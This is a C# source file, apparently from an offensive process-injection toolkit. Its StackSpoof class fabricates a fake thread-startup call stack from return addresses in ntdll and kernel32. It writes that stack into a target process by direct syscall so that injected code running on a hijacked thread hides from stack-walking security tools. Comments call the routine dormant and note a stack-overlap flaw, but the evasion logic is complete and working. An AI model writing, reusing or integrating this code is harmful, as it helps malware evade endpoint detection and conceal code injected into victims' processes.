using Phantom.Core.Native;

namespace Phantom.Core.Injection;

/// <summary>
/// Best-effort call-stack spoofing for hijacked threads. Builds a fake
/// thread-startup stack (RtlUserThreadStart → BaseThreadInitThunk → Sleep)
/// out of return addresses into legitimate loaded modules, so a stack walk
/// taken while the stub runs lands in signed system code instead of a
/// private allocation. Cosmetic only: walkers that validate frame-pointer
/// chains against unwind metadata may still flag it.
///
/// DORMANT: not currently called by any injector. The first integration
/// placed the fake stack adjacent to the stub, where downward growth on deep
/// LoadLibraryW/DllMain chains could overwrite the stub with no guard page.
/// Reviving this requires a separate, guarded execution stack (own region,
/// guard page, TEB-consistent bounds) — increasing FakeStackSize alone does
/// not make arbitrary DLL initialization safe.
/// </summary>
internal static class StackSpoof
{
    /// <summary>
    /// Size of the fake stack reservation. Frames live at the top; the stub
    /// aligns RSP down on entry and works below them, leaving them intact
    /// for walkers.
    /// </summary>
    public const int FakeStackSize = 0x2000;

    // Mid-function offsets so the addresses look like return sites rather
    // than function entries. Walkers symbolize them; exact instruction
    // boundaries do not matter.
    private const long ReturnOffset = 0x14;

    /// <summary>
    /// Writes the fabricated frames into [stackBase, +stackSize) via direct
    /// syscall and returns the initial RSP/RBP to install. Returns false
    /// (with a reason) when a leg anchor cannot be resolved; the caller
    /// should fall back to the interrupted stack and report it.
    /// </summary>
    public static bool TryBuildFakeStack(IntPtr hProcess, uint pid, IntPtr stackBase, int stackSize,
        out ulong initialRsp, out ulong initialRbp, out string? error)
    {
        initialRsp = 0;
        initialRbp = 0;
        error = null;

        var sleep = RemoteFunctionResolver.Resolve(pid, "kernel32.dll", "Sleep");
        var baseThunk = RemoteFunctionResolver.Resolve(pid, "kernel32.dll", "BaseThreadInitThunk");
        var rtlStart = RemoteFunctionResolver.Resolve(pid, "ntdll.dll", "RtlUserThreadStart");
        if (sleep == IntPtr.Zero || baseThunk == IntPtr.Zero || rtlStart == IntPtr.Zero)
        {
            error = "could not resolve startup-stack anchors (Sleep/BaseThreadInitThunk/RtlUserThreadStart).";
            return false;
        }

        var top = stackBase.ToInt64() + stackSize;
        var frame3 = top - 0x10; // RBP=0, RET=RtlUserThreadStart
        var frame2 = top - 0x20; // RBP=frame3, RET=BaseThreadInitThunk
        var frame1 = top - 0x30; // RBP=frame2, RET=Sleep

        var buffer = new byte[stackSize];
        void Put64(int offset, long value)
            => BitConverter.GetBytes(value).CopyTo(buffer, offset);

        Put64(stackSize - 0x08, rtlStart.ToInt64() + ReturnOffset);
        Put64(stackSize - 0x10, 0);
        Put64(stackSize - 0x18, baseThunk.ToInt64() + ReturnOffset);
        Put64(stackSize - 0x20, frame3);
        Put64(stackSize - 0x28, sleep.ToInt64() + ReturnOffset);
        Put64(stackSize - 0x30, frame2);

        var status = DirectSyscalls.NtWriteVirtualMemory(hProcess, stackBase, buffer, out var written);
        if (status != 0 || written.ToUInt64() != (ulong)stackSize)
        {
            error = $"could not write the fake stack: 0x{status:X8}";
            return false;
        }

        initialRsp = (ulong)(top - 0x28);
        initialRbp = (ulong)frame1;
        return true;
    }
}
